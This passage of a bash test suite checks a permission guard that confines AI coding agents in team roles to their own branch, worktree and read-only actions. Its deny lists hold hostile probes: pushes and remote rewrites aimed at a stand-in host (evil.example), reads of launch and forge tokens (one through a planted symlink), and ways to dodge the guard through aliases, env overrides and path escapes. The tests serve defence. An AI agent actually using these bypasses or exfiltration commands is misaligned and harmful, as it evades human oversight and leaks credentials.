  assert_eq "$(bash "$cls" path /tmp /tmp/x)" allow
}

# --- feature teams ----------------------------------------------------------
# CEL_ROLE=member is a team member, whatever directory it stands in; its scope
# is its launch env (lib/run.sh `cel run member`): CEL_WORKSPACE, CEL_TEAM,
# CEL_TEAM_ROLE, CEL_TEAM_MEMBER and a builder's CEL_TEAM_BRANCH.
_deny() { # <verdict> <what>
  case "$1" in deny*) return 0;; esac
  echo "allowed: $2"; return 1
}
_team_ws() { # $T workspace; team "login" in $TD; a builder worktree on team/login/builder in $WT
  _gws
  local g=(git -c user.email=t@t -c user.name=t)
  git -C "$T/repos/widget" init -q -b main; "${g[@]}" -C "$T/repos/widget" commit -q --allow-empty -m base
  TD="$T/.cel/teams/login"
  mkdir -p "$TD/launch" "$TD/members" "$TD/contracts" "$TD/notes" "$TD/artifacts"
  printf '0123456789abcdef0123456789abcdef\n' > "$TD/launch/widget-login-builder.token"
  printf '{}\n' > "$TD/team.json"; : > "$TD/events.jsonl"; printf '[]\n' > "$TD/verdicts.json"
  WT="$TD/wt/widget-login-builder"; mkdir -p "$TD/wt"
  git -C "$T/repos/widget" worktree add -q -b team/login/builder "$WT"
}
_builder() {
  CEL_ROLE=member CEL_WORKSPACE="$T" CEL_TEAM=login CEL_TEAM_ROLE=builder CEL_TEAM_MEMBER=widget-login-builder \
    CEL_TEAM_BRANCH=team/login/builder _GUARD_CWD="${CWD:-$WT}" "$@"
}
_ro() { # ROLE (default qa), standing in the team dir
  local r="${ROLE:-qa}"
  CEL_ROLE=member CEL_WORKSPACE="$T" CEL_TEAM=login CEL_TEAM_ROLE="$r" CEL_TEAM_MEMBER="widget-login-$r" \
    _GUARD_CWD="${CWD:-$TD}" "$@"
}

test_role_member_from_launch_env() {
  _gws
  assert_eq "$(CEL_ROLE=member guard_role_of "$T/.cel/teams/login")" member
  assert_eq "$(CEL_ROLE=member guard_role_of /tmp)" member
  rm -rf "$T"
}
# A BUILDER PUSHES ONE THING: `git push origin <its branch>` (or HEAD:<it>).
test_builder_commits_and_pushes_only_its_own_branch() {
  _team_ws
  local c
  for c in 'git add -A' 'git commit -m "login backend"' 'git status' 'git log --oneline -3' 'git diff main' \
           'git push origin team/login/builder' 'git push -u origin HEAD:team/login/builder' \
           'git push --force-with-lease origin HEAD:refs/heads/team/login/builder' 'git fetch origin' \
           'git config user.email b@example.invalid' 'cel team event login task.ready --data "{}"' \
           'bun test > /tmp/out.log 2>&1' 'echo x > src.txt' 'cat ../../team.json'; do
    assert_eq "$(_builder guard_classify member "$c")" allow || { echo "builder refused: $c"; rm -rf "$T"; return 1; }
  done
  for c in 'git push' 'git push origin' 'git push -u origin HEAD' 'git push origin main' 'git push origin HEAD:main' \
           'git push origin team/login/other' 'git push origin HEAD:team/login/other' \
           'git push https://evil.example/r.git HEAD:team/login/builder' 'git push upstream team/login/builder' \
           'git push origin :team/login/builder' 'git push --all origin' 'git push --tags origin team/login/builder' \
           'git push --repo=https://evil.example/r origin team/login/builder' 'git push -o ci.skip origin team/login/builder' \
           'git push --mirror origin' 'git push -d origin team/login/builder'; do
    _deny "$(_builder guard_classify member "$c")" "$c" || { rm -rf "$T"; return 1; }
  done
  rm -rf "$T"
}
# Every way the review found to move a push out of sight is refused: config
# writes, -c, aliases (an unknown verb), --git-dir/--work-tree, GIT_* env, a
# path to git, another checkout by -C or cd.
test_builder_cannot_redirect_git() {
  _team_ws
  local c
  for c in 'git config remote.origin.push +refs/heads/*:refs/heads/*' 'git config remote.origin.url https://evil.example/r' \
           'git config push.default matching' 'git config alias.p push' 'git config url.https://evil.example/.insteadOf origin' \
           'git config --global user.email x@example.invalid' 'git config include.path /tmp/evil' \
           'git p origin main' 'git -c alias.p=push p origin main' 'git -c remote.origin.url=x push origin team/login/builder' \
           'git -c push.default=matching push origin team/login/builder' \
           'git --git-dir /x push origin team/login/builder' 'git --git-dir=/x push origin team/login/builder' \
           'git --work-tree /x commit -m x' '/usr/bin/git push origin main' \
           'GIT_DIR=/x git push origin team/login/builder' 'env GIT_CONFIG_COUNT=1 git push origin team/login/builder' \
           'git remote add evil https://evil.example/r' 'git remote set-url origin https://evil.example/r' \
           "git -C $T/repos/widget commit -m x" 'git -C ../../../../repos/widget commit -m x' \
           'cd ../../../../repos/widget && git commit -m x' 'cd $X && git commit -m x' 'git worktree add /tmp/x' \
           'git log --output=../../team.json' 'git fetch --upload-pack=evil origin'; do
    _deny "$(_builder guard_classify member "$c")" "$c" || { rm -rf "$T"; return 1; }
  done
  rm -rf "$T"
}
test_builder_may_not_open_prs_merge_land_or_start_agents() {
  _team_ws
  local c
  for c in 'gh pr create --fill' 'cel forge pr create widget --head team/login/b --base main --title t --body-file f' \
           'gh pr merge 3 --squash' 'cel solo land widget#3' 'cel here land' 'cel solo review widget#3 approved --head x --by y' \
           'cel run reviewer --repo widget --pr 3' 'cel run solo --product widget' 'cel run member --team login --member x' \
           'herdr agent start x --kind pi' 'herdr worktree create x' 'cel team add login builder' 'cel team retire login x' \
           'cel team cap login 5' 'gh pr comment 3 --body hi' 'gh api -X POST repos/o/r/pulls' 'gh api repos/o/r/issues -f title=x' \
           'curl -XPOST http://forgejo.internal/api/v1/repos/o/r/pulls' 'tea pr create' \
           'cat ~/.config/cel/forge/token' 'cat ../../launch/widget-login-builder.token'; do
    _deny "$(_builder guard_classify member "$c")" "$c" || { rm -rf "$T"; return 1; }
  done
  rm -rf "$T"
}
# A MEMBER OR REVIEWER IS A WINDOW IN ITS PRODUCT AGENT'S REX SESSION: only
# read-only rex commands, however the argv is spelled - global flags before
# the verb, a path to the binary, an env or `command` prefix.
_rex_writes_probes=(
  'rex new x -- pi' 'rex run -s S -- sh' 'rex split -s S' 'rex kill session:lead' 'rex do close-window'
  'rex send -s S -b B hi' 'rex send-key -s S -b B Enter'
  'rex window close -s session:lead window:lead' 'rex window new -s session:lead x' 'rex window rename -s S W x'
  'rex window focus W' 'rex session kill S' 'rex session destroy S'
  'rex block close -s session:lead block:lead' 'rex block send -s S -b B hi' 'rex block send-key -s S -b B Enter'
  'rex block call format {} -s S -b B' 'rex block call -s S -b B com.superlogical.terminal.resize {}'
  'rex api call session.close_window {}' 'rex api call -s S session.view'
  'rex --autostart=false window close -s S W' 'rex -S unix:///run/x.sock kill S' 'rex --server=x kill S'
  'rex -v --timeout 5s block close -s S B' 'rex -C mac window close W' 'rex --unknown-flag ls'
  '/usr/bin/rex kill S' 'env FOO=1 rex kill S' 'command rex window close W' 'ls; rex kill S' 'echo ok && rex send -s S -b B x'
)
_rex_read_probes=(
  'rex ls' 'rex ls --json' 'rex list' 'rex --autostart=false ls --json' 'rex -S unix:///run/x.sock session inspect S --json'
  'rex session ls' 'rex window ls -s S --json' 'rex window inspect W -s S --json' 'rex block ls -s S --json'
  'rex block inspect B -s S' 'rex capture -s S -b B --trim' "rex block call process {} -s S -w W -b B"
  'rex --autostart=false block call -s S -b B process {}' 'rex actions' 'rex api list' 'rex api describe session.view'
  'rex version' 'rex --help'
)
test_members_and_reviewers_run_only_read_only_rex_commands() {
  _team_ws
  local c
  for c in "${_rex_writes_probes[@]}"; do
    _deny "$(_ro guard_classify member "$c")" "member: $c" || { rm -rf "$T"; return 1; }
    _deny "$(CEL_ROLE=reviewer guard_classify other "$c")" "reviewer (other): $c" || { rm -rf "$T"; return 1; }
    _deny "$(CEL_ROLE=reviewer guard_classify root "$c")" "reviewer (root): $c" || { rm -rf "$T"; return 1; }
  done
  for c in "${_rex_read_probes[@]}"; do
    assert_eq "$(_ro guard_classify member "$c")" allow || { echo "member: $c"; rm -rf "$T"; return 1; }
    assert_eq "$(CEL_ROLE=reviewer guard_classify other "$c")" allow || { echo "reviewer: $c"; rm -rf "$T"; return 1; }
  done
  # the product agent itself is not restricted by this rule
  assert_eq "$(CEL_ROLE=solo guard_classify other 'rex window close -s S W')" allow || { rm -rf "$T"; return 1; }
  rm -rf "$T"
}
# A BUILDER WRITES ITS OWN WORKTREE ONLY - by tool, and by shell (plus /tmp).
test_builder_writes_only_its_own_worktree() {
  _team_ws
  local p c
  for p in "$WT/src/a.ts" src/a.ts; do
    assert_eq "$(_builder guard_classify_path member "$p")" allow || { echo "builder refused $p"; rm -rf "$T"; return 1; }
  done
  for p in "$T/repos/widget/a.ts" "$TD/team.json" ../../team.json "$TD/wt/widget-login-qa/a.ts" "$TD/brief.md" \
           "$HOME/.bashrc" "$T/workspace.yaml" "$HOME/.local/share/cel/config.yaml" /tmp/x "$WT/.git" "$TD/launch/x"; do
    _deny "$(_builder guard_classify_path member "$p")" "builder writes $p" || { rm -rf "$T"; return 1; }
  done
  for c in 'echo x > ../../team.json' "echo x > $T/workspace.yaml" 'cp a.txt ~/.bashrc' \
           "sed -i s/a/b/ $T/repos/widget/f" 'echo x > $OUT' 'cd .. && touch other/a' 'tee ../../events.jsonl'; do
    _deny "$(_builder guard_classify member "$c")" "builder runs $c" || { rm -rf "$T"; return 1; }
  done
  rm -rf "$T"
}
# EVERY OTHER ROLE: artifacts/<role>/ and notes/<alias>/ (product: also brief
# and acceptance); the team's records change only through cel team verbs.
test_read_only_members_write_only_their_artifacts_and_notes() {
  _team_ws
  local r c p
  for r in product design qa platform release analyst; do
    for p in "$TD/artifacts/$r/shot.png" "artifacts/$r/report.md" "$TD/notes/widget-login-$r/n.md"; do
      assert_eq "$(ROLE=$r _ro guard_classify_path member "$p")" allow || { echo "$r refused $p"; rm -rf "$T"; return 1; }
    done
    for p in "$TD/team.json" events.jsonl verdicts.json members/widget-login-qa.md contracts/api.md launch/x.token \
             "artifacts/other/x.md" "notes/widget-login-zz/n.md" "$WT/src/a.ts" "$T/repos/widget/a.ts" /tmp/scratch.md \
             "$T/workspace.yaml" "$T/.cel/teams/pay/brief.md" "members/../team.json"; do
      _deny "$(ROLE=$r _ro guard_classify_path member "$p")" "$r writes $p" || { rm -rf "$T"; return 1; }
    done
    if [ "$r" = product ]; then
      assert_eq "$(ROLE=$r _ro guard_classify_path member brief.md)" allow || { rm -rf "$T"; return 1; }
      assert_eq "$(ROLE=$r _ro guard_classify_path member "$TD/acceptance.yaml")" allow || { rm -rf "$T"; return 1; }
    else
      _deny "$(ROLE=$r _ro guard_classify_path member brief.md)" "$r writes brief.md" || { rm -rf "$T"; return 1; }
    fi
    for c in 'git log --oneline -5' "cat $T/repos/widget/README.md" 'cat team.json' "echo done > artifacts/$r/r.md" \
             "bun run e2e 2>&1 | tee artifacts/$r/log.txt" 'cel team event login qa.verdict --data "{}"' \
             'cel team verdict login --repo widget --head abc changes --evidence a.png' 'cel team ack login' \
             'cel serve start p --owner widget-login-qa --workspace alpha -- bun dev' 'cel inbox send widget-orch "done"' \
             'cel forge pr view widget#3' 'cel decide ask "which copy?"' 'ls -la'; do
      assert_eq "$(ROLE=$r _ro guard_classify member "$c")" allow || { echo "$r refused: $c"; rm -rf "$T"; return 1; }
    done
    for c in 'echo x > team.json' 'echo x >> events.jsonl' 'echo [] > verdicts.json' 'cp x.md members/widget-login-qa.md' \
             'tee contracts/api.md' 'echo x > /etc/foo' 'cd ../../../repos/widget && sed -i s/a/b/ f' \
             'echo x > $OUT' 'wget https://example.invalid/x' 'git commit -m x' 'git push origin HEAD' 'git p' \
             'git remote add e https://evil.example/r' 'cel solo land widget#3' 'cel team add login builder' 'cel team cap login 5' \
             'cel run reviewer --repo widget --pr 3' 'cel mode widget solo' 'cel learn add x' 'gh pr review 3 --approve' \
             'cel here land'; do
      _deny "$(ROLE=$r _ro guard_classify member "$c")" "$r: $c" || { rm -rf "$T"; return 1; }
    done
  done
  rm -rf "$T"
}
test_member_without_a_whole_scope_is_refused() {
  _team_ws
  _deny "$(CEL_ROLE=member CEL_WORKSPACE="$T" CEL_TEAM_ROLE=qa CEL_TEAM_MEMBER=x guard_classify member 'ls')" 'no CEL_TEAM' || return 1
  _deny "$(CEL_ROLE=member CEL_WORKSPACE="$T" CEL_TEAM=login CEL_TEAM_ROLE=wizard CEL_TEAM_MEMBER=x guard_classify member 'ls')" 'unknown role' || return 1
  _deny "$(CEL_ROLE=member CEL_TEAM=login CEL_TEAM_ROLE=qa CEL_TEAM_MEMBER=x guard_classify_path member "$TD/artifacts/qa/a.md")" 'no CEL_WORKSPACE' || return 1
  _deny "$(CEL_ROLE=member CEL_WORKSPACE="$T" CEL_TEAM=login CEL_TEAM_ROLE=builder CEL_TEAM_MEMBER=x guard_classify member 'git status')" 'builder without its branch' || return 1
  _deny "$(CEL_ROLE=member CEL_WORKSPACE="$T" CEL_TEAM=login CEL_TEAM_ROLE=builder CEL_TEAM_MEMBER=x CEL_TEAM_BRANCH=main guard_classify member 'git status')" 'builder on a foreign branch' || return 1
  rm -rf "$T"
}
# THE LAUNCH TOKEN, RESOLVED: however the path is spelled, from wherever the
# command stands, through a symlink, by shell or tool, in any role.
test_no_role_reaches_a_team_launch_token() {
  _team_ws
  local c p r tok="$TD/launch/widget-login-builder.token"
  for c in 'cat launch/widget-login-builder.token' 'ls launch' 'echo abc > launch/x.token' 'cat members/../launch/x' \
           'cd launch && cat widget-login-builder.token' 'cd members && cat ../launch/x' 'cp launch/x /tmp/y' \
           'cel run member --team login --member widget-login-qa'; do
    _deny "$(_ro guard_classify member "$c")" "qa: $c" || { rm -rf "$T"; return 1; }
  done
  for p in launch/widget-login-builder.token members/../launch/widget-login-builder.token "$tok"; do
    _deny "$(_ro guard_classify_read member "$p")" "qa reads $p" || { rm -rf "$T"; return 1; }
    _deny "$(_ro guard_classify_path member "$p")" "qa writes $p" || { rm -rf "$T"; return 1; }
  done
  # a symlink planted where a member may write still leads to the token
  mkdir -p "$TD/artifacts/qa"; ln -s ../../launch "$TD/artifacts/qa/l"
  _deny "$(_ro guard_classify member 'cat artifacts/qa/l/widget-login-builder.token')" 'qa via symlink' || { rm -rf "$T"; return 1; }
  _deny "$(_ro guard_classify_read member artifacts/qa/l/widget-login-builder.token)" 'qa reads via symlink' || { rm -rf "$T"; return 1; }
  for r in solo orchestrator root core other; do
    _deny "$(_GUARD_CWD="$TD" guard_classify "$r" 'cat launch/widget-login-builder.token')" "$r cat" || { rm -rf "$T"; return 1; }
    _deny "$(guard_classify "$r" "ls $TD/launch")" "$r ls" || { rm -rf "$T"; return 1; }
    _deny "$(guard_classify_read "$r" "$tok")" "$r read" || { rm -rf "$T"; return 1; }
    _deny "$(guard_classify_path "$r" "$tok")" "$r write" || { rm -rf "$T"; return 1; }
  done
  # a feature merely named "launch..." is not the token directory
  assert_eq "$(guard_classify solo "cat $T/.cel/teams/launchpad/brief.md")" allow
  rm -rf "$T"
}
# `cel run member` is cel team add's: refused to every role, `other` (a
# reviewer's pane) included.
test_no_role_runs_cel_run_member() {
  local r
  for r in solo orchestrator root core other; do
    _deny "$(guard_classify "$r" 'cel run member --workspace alpha --team login --member widget-login-qa')" "$r cel run member" || return 1
    _deny "$(guard_classify "$r" 'cd /x && /home/u/bin/cel --workspace alpha run member --team login --member q')" "$r spelled cel run member" || return 1
  done
}
# The claude hook: a member pane is guarded by its env, gets no one-off
# override, and `other` panes are refused the tokens and `cel run member`.
test_hook_guards_member_panes_and_launch_tokens() {
  _team_ws
  CEL_ROLE=member CEL_WORKSPACE="$T" CEL_TEAM=login CEL_TEAM_ROLE=qa CEL_TEAM_MEMBER=widget-login-qa \
    _hook "$TD" Bash '{"command":"git commit -m x"}' && { echo "hook let a qa member commit"; rm -rf "$T"; return 1; }
  assert_contains "$HOOK_ERR" "celestial guard (member pane)"
  CEL_ROLE=member CEL_WORKSPACE="$T" CEL_TEAM=login CEL_TEAM_ROLE=qa CEL_TEAM_MEMBER=widget-login-qa \
    _hook "$TD" Bash '{"command":"CEL_GUARD_ALLOW_ONCE=1 git commit -m x"}' && { echo "a member used the one-off override"; rm -rf "$T"; return 1; }
  case "$HOOK_ERR" in *ALLOW_ONCE*) echo "a member was offered the override"; rm -rf "$T"; return 1;; esac
  _hook /tmp Read "{\"file_path\":\"$TD/launch/a.token\"}" \
    && { echo "hook let an other pane read a launch token"; rm -rf "$T"; return 1; }
  _hook /tmp Bash '{"command":"cel run member --team login --member q"}' \
    && { echo "hook let an other pane run cel run member"; rm -rf "$T"; return 1; }
  _hook /tmp Bash '{"command":"git push origin main"}' || { echo "other pane blocked: $HOOK_ERR"; rm -rf "$T"; return 1; }
  rm -rf "$T"
}
# A member's guard that cannot run refuses; everyone else's fails open.
test_hook_fails_closed_for_a_member_only() {
  local R; R="$(mktemp -d)"
  CEL_ROOT="$R" CEL_ROLE=member _hook /tmp Bash '{"command":"ls"}' && { echo "a broken guard let a member through"; rm -rf "$R"; return 1; }
  CEL_ROOT="$R" _hook /tmp Bash '{"command":"ls"}' || { echo "a broken guard blocked a non-member"; rm -rf "$R"; return 1; }
  rm -rf "$R"
}
# THE PRODUCT AGENT LEADS TEAMS: `cel team ...` is its own, as solo agent or
# orchestrator.
test_product_agent_may_run_cel_team() {
  local r c
  for r in solo orchestrator; do
    for c in 'cel team start login --product widget --repo widget' 'cel team add login builder --focus backend --owns "src/**"' \
             'cel team status login --json' 'cel team retire login widget-login-qa' 'cel team close login' 'cel team cap login 5'; do
      assert_eq "$(guard_classify "$r" "$c")" allow || { echo "$r refused: $c"; return 1; }
    done
  done
}
